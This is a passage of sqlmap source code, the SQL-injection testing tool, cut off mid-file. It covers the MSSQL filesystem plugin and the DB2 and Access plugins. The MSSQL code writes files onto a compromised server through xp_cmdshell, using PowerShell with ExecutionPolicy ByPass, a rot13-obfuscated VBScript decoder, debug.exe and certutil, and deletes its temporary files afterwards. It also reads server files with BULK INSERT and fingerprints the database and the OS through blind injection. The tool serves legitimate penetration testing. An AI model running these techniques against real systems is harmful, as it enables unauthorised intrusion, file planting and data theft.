"plugins/dbms/mssqlserver/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport ntpath\nimport os\n\nfrom lib.core.common import checkFile\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import posixToNtSlashes\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.compat import xrange\nfrom lib.core.convert import encodeBase64\nfrom lib.core.convert import encodeHex\nfrom lib.core.convert import rot13\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.request import inject\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def _dataToScr(self, fileContent, chunkName):\n        fileLines = []\n        fileSize = len(fileContent)\n        lineAddr = 0x100\n        lineLen = 20\n\n        fileLines.append(\"n %s\" % chunkName)\n        fileLines.append(\"rcx\")\n        fileLines.append(\"%x\" % fileSize)\n        fileLines.append(\"f 0100 %x 00\" % fileSize)\n\n        for fileLine in xrange(0, len(fileContent), lineLen):\n            scrString = \"\"\n\n            for lineChar in fileContent[fileLine:fileLine + lineLen]:\n                strLineChar = encodeHex(lineChar, binary=False)\n\n                if not scrString:\n                    scrString = \"e %x %s\" % (lineAddr, strLineChar)\n                else:\n                    scrString += \" %s\" % strLineChar\n\n                lineAddr += len(strLineChar) // 2\n\n            fileLines.append(scrString)\n\n        fileLines.append(\"w\")\n        fileLines.append(\"q\")\n\n        return fileLines\n\n    def _updateDestChunk(self, fileContent, tmpPath):\n        randScr = \"tmpf%s.scr\" % randomStr(lowercase=True)\n        chunkName = randomStr(lowercase=True)\n        fileScrLines = self._dataToScr(fileContent, chunkName)\n\n        logger.debug(\"uploading debug script to %s\\\\%s, please wait..\" % (tmpPath, randScr))\n\n        self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)\n\n        logger.debug(\"generating chunk file %s\\\\%s from debug script %s\" % (tmpPath, chunkName, randScr))\n\n        commands = (\n            \"cd \\\"%s\\\"\" % tmpPath,\n            \"debug < %s\" % randScr,\n            \"del /F /Q %s\" % randScr\n        )\n\n        self.execCmd(\" & \".join(command for command in commands))\n\n        return chunkName\n\n    def stackedReadFile(self, remoteFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % remoteFile\n            logger.info(infoMsg)\n\n        result = []\n        txtTbl = self.fileTblName\n        hexTbl = \"%s%shex\" % (self.fileTblName, randomStr())\n\n        self.createSupportTbl(txtTbl, self.tblField, \"text\")\n        inject.goStacked(\"DROP TABLE %s\" % hexTbl)\n        inject.goStacked(\"CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)\" % (hexTbl, self.tblField, \"VARCHAR(4096)\"))\n\n        logger.debug(\"loading the content of file '%s' into support table\" % remoteFile)\n        inject.goStacked(\"BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')\" % (txtTbl, remoteFile, randomStr(10), randomStr(10)), silent=True)\n\n        # Reference: https://web.archive.org/web/20120211184457/http://support.microsoft.com/kb/104829\n        binToHexQuery = \"\"\"DECLARE @charset VARCHAR(16)\n        DECLARE @counter INT\n        DECLARE @hexstr VARCHAR(4096)\n        DECLARE @length INT\n        DECLARE @chunk INT\n\n        SET @charset = '0123456789ABCDEF'\n        SET @counter = 1\n        SET @hexstr = ''\n        SET @length = (SELECT DATALENGTH(%s) FROM %s)\n        SET @chunk = 1024\n\n        WHILE (@counter <= @length)\n        BEGIN\n            DECLARE @tempint INT\n            DECLARE @firstint INT\n            DECLARE @secondint INT\n\n            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))\n            SET @firstint = floor(@tempint/16)\n            SET @secondint = @tempint - (@firstint * 16)\n            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)\n\n            SET @counter = @counter + 1\n\n            IF @counter %% @chunk = 0\n            BEGIN\n                INSERT INTO %s(%s) VALUES(@hexstr)\n                SET @hexstr = ''\n            END\n        END\n\n        IF @counter %% (@chunk) != 0\n        BEGIN\n            INSERT INTO %s(%s) VALUES(@hexstr)\n        END\n        \"\"\" % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)\n\n        binToHexQuery = binToHexQuery.replace(\"    \", \"\").replace(\"\\n\", \" \")\n        inject.goStacked(binToHexQuery)\n\n        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):\n            result = inject.getValue(\"SELECT %s FROM %s ORDER BY id ASC\" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)\n\n        if not result:\n            result = []\n            count = inject.getValue(\"SELECT COUNT(*) FROM %s\" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n            if not isNumPosStrValue(count):\n                errMsg = \"unable to retrieve the content of the \"\n                errMsg += \"file '%s'\" % remoteFile\n                raise SqlmapNoneDataException(errMsg)\n\n            indexRange = getLimitRange(count)\n\n            for index in indexRange:\n                chunk = inject.getValue(\"SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC\" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)\n                result.append(chunk)\n\n        inject.goStacked(\"DROP TABLE %s\" % hexTbl)\n\n        return result\n\n    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        errMsg = \"Microsoft SQL Server does not support file upload with \"\n        errMsg += \"UNION query SQL injection technique\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):\n        infoMsg = \"using PowerShell to write the %s file content \" % fileType\n        infoMsg += \"to file '%s'\" % remoteFile\n        logger.info(infoMsg)\n\n        encodedFileContent = encodeBase64(localFileContent, binary=False)\n        encodedBase64File = \"tmpf%s.txt\" % randomStr(lowercase=True)\n        encodedBase64FilePath = \"%s\\\\%s\" % (tmpPath, encodedBase64File)\n\n        randPSScript = \"tmpps%s.ps1\" % randomStr(lowercase=True)\n        randPSScriptPath = \"%s\\\\%s\" % (tmpPath, randPSScript)\n\n        localFileSize = len(encodedFileContent)\n        chunkMaxSize = 1024\n\n        logger.debug(\"uploading the base64-encoded file to %s, please wait..\" % encodedBase64FilePath)\n\n        for i in xrange(0, localFileSize, chunkMaxSize):\n            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]\n            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)\n\n        psString = \"$Base64 = Get-Content -Path \\\"%s\\\"; \" % encodedBase64FilePath\n        psString += \"$Base64 = $Base64 -replace \\\"`t|`n|`r\\\",\\\"\\\"; $Content = \"\n        psString += \"[System.Convert]::FromBase64String($Base64); Set-Content \"\n        psString += \"-Path \\\"%s\\\" -Value $Content -Encoding Byte\" % remoteFile\n\n        logger.debug(\"uploading the PowerShell base64-decoding script to %s\" % randPSScriptPath)\n        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)\n\n        logger.debug(\"executing the PowerShell base64-decoding script to write the %s file, please wait..\" % remoteFile)\n\n        commands = (\n            \"powershell -ExecutionPolicy ByPass -File \\\"%s\\\"\" % randPSScriptPath,\n            \"del /F /Q \\\"%s\\\"\" % encodedBase64FilePath,\n            \"del /F /Q \\\"%s\\\"\" % randPSScriptPath\n        )\n\n        self.execCmd(\" & \".join(command for command in commands))\n\n    def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):\n        infoMsg = \"using debug.exe to write the %s \" % fileType\n        infoMsg += \"file content to file '%s', please wait..\" % remoteFile\n        logger.info(infoMsg)\n\n        remoteFileName = ntpath.basename(remoteFile)\n        sFile = \"%s\\\\%s\" % (tmpPath, remoteFileName)\n        localFileSize = os.path.getsize(localFile)\n        debugSize = 0xFF00\n\n        if localFileSize < debugSize:\n            chunkName = self._updateDestChunk(localFileContent, tmpPath)\n\n            debugMsg = \"renaming chunk file %s\\\\%s to %s \" % (tmpPath, chunkName, fileType)\n            debugMsg += \"file %s\\\\%s and moving it to %s\" % (tmpPath, remoteFileName, remoteFile)\n            logger.debug(debugMsg)\n\n            commands = (\n                \"cd \\\"%s\\\"\" % tmpPath,\n                \"ren %s %s\" % (chunkName, remoteFileName),\n                \"move /Y %s %s\" % (remoteFileName, remoteFile)\n            )\n\n            self.execCmd(\" & \".join(command for command in commands))\n        else:\n            debugMsg = \"the file is larger than %d bytes. \" % debugSize\n            debugMsg += \"sqlmap will split it into chunks locally, upload \"\n            debugMsg += \"it chunk by chunk and recreate the original file \"\n            debugMsg += \"on the server, please wait..\"\n            logger.debug(debugMsg)\n\n            for i in xrange(0, localFileSize, debugSize):\n                localFileChunk = localFileContent[i:i + debugSize]\n                chunkName = self._updateDestChunk(localFileChunk, tmpPath)\n\n                if i == 0:\n                    debugMsg = \"renaming chunk \"\n                    copyCmd = \"ren %s %s\" % (chunkName, remoteFileName)\n                else:\n                    debugMsg = \"appending chunk \"\n                    copyCmd = \"copy /B /Y %s+%s %s\" % (remoteFileName, chunkName, remoteFileName)\n\n                debugMsg += \"%s\\\\%s to %s file %s\\\\%s\" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)\n                logger.debug(debugMsg)\n\n                commands = (\n                    \"cd \\\"%s\\\"\" % tmpPath,\n                    copyCmd,\n                    \"del /F /Q %s\" % chunkName\n                )\n\n                self.execCmd(\" & \".join(command for command in commands))\n\n            logger.debug(\"moving %s file %s to %s\" % (fileType, sFile, remoteFile))\n\n            commands = (\n                \"cd \\\"%s\\\"\" % tmpPath,\n                \"move /Y %s %s\" % (remoteFileName, remoteFile)\n            )\n\n            self.execCmd(\" & \".join(command for command in commands))\n\n    def _stackedWriteFileVbs(self, tmpPath, localFileContent, remoteFile, fileType):\n        infoMsg = \"using a custom visual basic script to write the \"\n        infoMsg += \"%s file content to file '%s', please wait..\" % (fileType, remoteFile)\n        logger.info(infoMsg)\n\n        randVbs = \"tmps%s.vbs\" % randomStr(lowercase=True)\n        randFile = \"tmpf%s.txt\" % randomStr(lowercase=True)\n        randFilePath = \"%s\\\\%s\" % (tmpPath, randFile)\n\n        vbs = \"\"\"Qvz vachgSvyrCngu, bhgchgSvyrCngu\n        vachgSvyrCngu = \"%f\"\n        bhgchgSvyrCngu = \"%f\"\n        Frg sf = PerngrBowrpg(\"Fpevcgvat.SvyrFlfgrzBowrpg\")\n        Frg svyr = sf.TrgSvyr(vachgSvyrCngu)\n        Vs svyr.Fvmr Gura\n            Jfpevcg.Rpub \"Ybnqvat sebz: \" & vachgSvyrCngu\n            Jfpevcg.Rpub\n            Frg sq = sf.BcraGrkgSvyr(vachgSvyrCngu, 1)\n            qngn = sq.ErnqNyy\n            sq.Pybfr\n            qngn = Ercynpr(qngn, \" \", \"\")\n            qngn = Ercynpr(qngn, ioPe, \"\")\n            qngn = Ercynpr(qngn, ioYs, \"\")\n            Jfpevcg.Rpub \"Svkrq Vachg: \"\n            Jfpevcg.Rpub qngn\n            Jfpevcg.Rpub\n            qrpbqrqQngn = onfr64_qrpbqr(qngn)\n            Jfpevcg.Rpub \"Bhgchg: \"\n            Jfpevcg.Rpub qrpbqrqQngn\n            Jfpevcg.Rpub\n            Jfpevcg.Rpub \"Jevgvat bhgchg va: \" & bhgchgSvyrCngu\n            Jfpevcg.Rpub\n            Frg bsf = PerngrBowrpg(\"Fpevcgvat.SvyrFlfgrzBowrpg\").BcraGrkgSvyr(bhgchgSvyrCngu, 2, Gehr)\n            bsf.Jevgr qrpbqrqQngn\n            bsf.pybfr\n        Ryfr\n            Jfpevcg.Rpub \"Gur svyr vf rzcgl.\"\n        Raq Vs\n        Shapgvba onfr64_qrpbqr(olIny fgeVa)\n            Qvz j1, j2, j3, j4, a, fgeBhg\n            Sbe a = 1 Gb Yra(fgeVa) Fgrc 4\n                j1 = zvzrqrpbqr(Zvq(fgeVa, a, 1))\n                j2 = zvzrqrpbqr(Zvq(fgeVa, a + 1, 1))\n                j3 = zvzrqrpbqr(Zvq(fgeVa, a + 2, 1))\n                j4 = zvzrqrpbqr(Zvq(fgeVa, a + 3, 1))\n                Vs Abg j2 Gura _\n                fgeBhg = fgeBhg + Pue(((j1 * 4 + Vag(j2 / 16)) Naq 255))\n                Vs  Abg j3 Gura _\n                fgeBhg = fgeBhg + Pue(((j2 * 16 + Vag(j3 / 4)) Naq 255))\n                Vs Abg j4 Gura _\n                fgeBhg = fgeBhg + Pue(((j3 * 64 + j4) Naq 255))\n            Arkg\n            onfr64_qrpbqr = fgeBhg\n            Raq Shapgvba\n        Shapgvba zvzrqrpbqr(olIny fgeVa)\n            Onfr64Punef = \"NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/\"\n            Vs Yra(fgeVa) = 0 Gura\n                zvzrqrpbqr = -1 : Rkvg Shapgvba\n            Ryfr\n                zvzrqrpbqr = VaFge(Onfr64Punef, fgeVa) - 1\n            Raq Vs\n        Raq Shapgvba\"\"\"\n\n        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5581\n        vbs = rot13(vbs)\n        vbs = vbs.replace(\"    \", \"\")\n        encodedFileContent = encodeBase64(localFileContent, binary=False)\n\n        logger.debug(\"uploading the file base64-encoded content to %s, please wait..\" % randFilePath)\n\n        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)\n\n        logger.debug(\"uploading a visual basic decoder stub %s\\\\%s, please wait..\" % (tmpPath, randVbs))\n\n        self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)\n\n        commands = (\n            \"cd \\\"%s\\\"\" % tmpPath,\n            \"cscript //nologo %s\" % randVbs,\n            \"del /F /Q %s\" % randVbs,\n            \"del /F /Q %s\" % randFile\n        )\n\n        self.execCmd(\" & \".join(command for command in commands))\n\n    def _stackedWriteFileCertutilExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):\n        infoMsg = \"using certutil.exe to write the %s \" % fileType\n        infoMsg += \"file content to file '%s', please wait..\" % remoteFile\n        logger.info(infoMsg)\n\n        chunkMaxSize = 500\n\n        randFile = \"tmpf%s.txt\" % randomStr(lowercase=True)\n        randFilePath = \"%s\\\\%s\" % (tmpPath, randFile)\n\n        encodedFileContent = encodeBase64(localFileContent, binary=False)\n\n        splittedEncodedFileContent = '\\n'.join([encodedFileContent[i:i + chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])\n\n        logger.debug(\"uploading the file base64-encoded content to %s, please wait..\" % randFilePath)\n\n        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)\n\n        logger.debug(\"decoding the file to %s..\" % remoteFile)\n\n        commands = (\n            \"cd \\\"%s\\\"\" % tmpPath,\n            \"certutil -f -decode %s %s\" % (randFile, remoteFile),\n            \"del /F /Q %s\" % randFile\n        )\n\n        self.execCmd(\" & \".join(command for command in commands))\n\n    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        # NOTE: this is needed here because we use xp_cmdshell extended\n        # procedure to write a file on the back-end Microsoft SQL Server\n        # file system\n        self.initEnv()\n        self.getRemoteTempPath()\n\n        tmpPath = posixToNtSlashes(conf.tmpPath)\n        remoteFile = posixToNtSlashes(remoteFile)\n\n        checkFile(localFile)\n        localFileContent = open(localFile, \"rb\").read()\n\n        self._stackedWriteFilePS(tmpPath, localFileContent, remoteFile, fileType)\n        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n        if written is False:\n            message = \"do you want to try to upload the file with \"\n            message += \"the custom Visual Basic script technique? [Y/n] \"\n\n            if readInput(message, default='Y', boolean=True):\n                self._stackedWriteFileVbs(tmpPath, localFileContent, remoteFile, fileType)\n                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n        if written is False:\n            message = \"do you want to try to upload the file with \"\n            message += \"the built-in debug.exe technique? [Y/n] \"\n\n            if readInput(message, default='Y', boolean=True):\n                self._stackedWriteFileDebugExe(tmpPath, localFile, localFileContent, remoteFile, fileType)\n                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n        if written is False:\n            message = \"do you want to try to upload the file with \"\n            message += \"the built-in certutil.exe technique? [Y/n] \"\n\n            if readInput(message, default='Y', boolean=True):\n                self._stackedWriteFileCertutilExe(tmpPath, localFile, localFileContent, remoteFile, fileType)\n                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n        return written\n", "plugins/dbms/mssqlserver/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import MSSQL_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.mssqlserver.enumeration import Enumeration\nfrom plugins.dbms.mssqlserver.filesystem import Filesystem\nfrom plugins.dbms.mssqlserver.fingerprint import Fingerprint\nfrom plugins.dbms.mssqlserver.syntax import Syntax\nfrom plugins.dbms.mssqlserver.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass MSSQLServerMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Microsoft SQL Server methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = MSSQL_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.MSSQL] = Syntax.escape\n", "plugins/dbms/db2/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on IBM DB2 it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on IBM DB2 it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/db2/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import ibm_db_dbi\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/ibmdb/python-ibmdb\n    User guide: https://github.com/ibmdb/python-ibmdb/wiki/README\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: Apache License 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            database = \"DRIVER={IBM DB2 ODBC DRIVER};DATABASE=%s;HOSTNAME=%s;PORT=%s;PROTOCOL=TCPIP;\" % (self.db, self.hostname, self.port)\n            self.connector = ibm_db_dbi.connect(database, self.user, self.password)\n        except ibm_db_dbi.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except ibm_db_dbi.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (ibm_db_dbi.OperationalError, ibm_db_dbi.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n        except ibm_db_dbi.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/db2/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/db2/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import DB2_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.DB2)\n\n    def _versionCheck(self):\n        minor, major = None, None\n\n        for version in reversed(xrange(5, 15)):\n            result = inject.checkBooleanExpression(\"(SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN %d000000 AND %d999999)>0\" % (version, version))\n\n            if result:\n                major = version\n\n                for version in reversed(xrange(0, 20)):\n                    result = inject.checkBooleanExpression(\"(SELECT COUNT(*) FROM sysibm.sysversions WHERE versionnumber BETWEEN %d%02d0000 AND %d%02d9999)>0\" % (major, version, major, version))\n                    if result:\n                        minor = version\n                        version = \"%s.%s\" % (major, minor)\n                        break\n\n                break\n\n        if major and minor:\n            return \"%s.%s\" % (major, minor)\n        else:\n            return None\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.DB2\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(DB2_ALIASES):\n            setDbms(DBMS.DB2)\n\n            return True\n\n        logMsg = \"testing %s\" % DBMS.DB2\n        logger.info(logMsg)\n\n        result = inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM SYSIBM.SYSDUMMY1)\")\n\n        if result:\n            logMsg = \"confirming %s\" % DBMS.DB2\n            logger.info(logMsg)\n\n            result = inject.checkBooleanExpression(\"JULIAN_DAY(CURRENT DATE) IS NOT NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.DB2\n                logger.warning(warnMsg)\n\n                return False\n\n            version = self._versionCheck()\n            if version:\n                Backend.setVersion(version)\n                setDbms(\"%s %s\" % (DBMS.DB2, Backend.getVersion()))\n            else:\n                setDbms(DBMS.DB2)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.DB2\n            logger.warning(warnMsg)\n\n            return False\n\n    def checkDbmsOs(self, detailed=False):\n        if Backend.getOs():\n            return\n\n        infoMsg = \"fingerprinting the back-end DBMS operating system \"\n        infoMsg += \"version and service pack\"\n        logger.info(infoMsg)\n\n        query = \"(SELECT LENGTH(OS_NAME) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_NAME LIKE '%WIN%')>0\"\n        result = inject.checkBooleanExpression(query)\n\n        if not result:\n            Backend.setOs(OS.LINUX)\n        else:\n            Backend.setOs(OS.WINDOWS)\n\n        infoMsg = \"the back-end DBMS operating system is %s\" % Backend.getOs()\n\n        if result:\n            versions = {\n                \"2003\": (\"5.2\", (2, 1)),\n                \"2008\": (\"7.0\", (1,)),\n                \"2000\": (\"5.0\", (4, 3, 2, 1)),\n                \"7\": (\"6.1\", (1, 0)),\n                \"XP\": (\"5.1\", (2, 1)),\n                \"NT\": (\"4.0\", (6, 5, 4, 3, 2, 1))\n            }\n\n            # Get back-end DBMS underlying operating system version\n            for version, data in versions.items():\n                query = \"(SELECT LENGTH(OS_VERSION) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_VERSION = '%s')>0\" % data[0]\n                result = inject.checkBooleanExpression(query)\n\n                if result:\n                    Backend.setOsVersion(version)\n                    infoMsg += \" %s\" % Backend.getOsVersion()\n                    break\n\n            if not Backend.getOsVersion():\n                return\n\n            # Get back-end DBMS underlying operating system service pack\n            for sp in versions[Backend.getOsVersion()][1]:\n                query = \"(SELECT LENGTH(OS_RELEASE) FROM SYSIBMADM.ENV_SYS_INFO WHERE OS_RELEASE LIKE '%Service Pack \" + str(sp) + \"%')>0\"\n                result = inject.checkBooleanExpression(query)\n\n                if result:\n                    Backend.setOsServicePack(sp)\n                    break\n\n            if not Backend.getOsServicePack():\n                Backend.setOsServicePack(0)\n                debugMsg = \"assuming the operating system has no service pack\"\n                logger.debug(debugMsg)\n\n            if Backend.getOsVersion():\n                infoMsg += \" Service Pack %d\" % Backend.getOsServicePack()\n\n            logger.info(infoMsg)\n", "plugins/dbms/db2/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def __init__(self):\n        self.__basedir = None\n        self.__datadir = None\n\n        GenericTakeover.__init__(self)\n", "plugins/dbms/db2/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/db2/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import DB2_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.db2.enumeration import Enumeration\nfrom plugins.dbms.db2.filesystem import Filesystem\nfrom plugins.dbms.db2.fingerprint import Fingerprint\nfrom plugins.dbms.db2.syntax import Syntax\nfrom plugins.dbms.db2.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass DB2Map(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines DB2 methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = DB2_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.DB2] = Syntax.escape\n", "plugins/dbms/access/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Microsoft Access it is not possible to get the banner\"\n        logger.warning(warnMsg)\n\n        return None\n\n    def getCurrentUser(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        warnMsg = \"on Microsoft Access it is not possible to get name of the current database\"\n        logger.warning(warnMsg)\n\n    def isDba(self, user=None):\n        warnMsg = \"on Microsoft Access it is not possible to test if current user is DBA\"\n        logger.warning(warnMsg)\n\n    def getUsers(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on 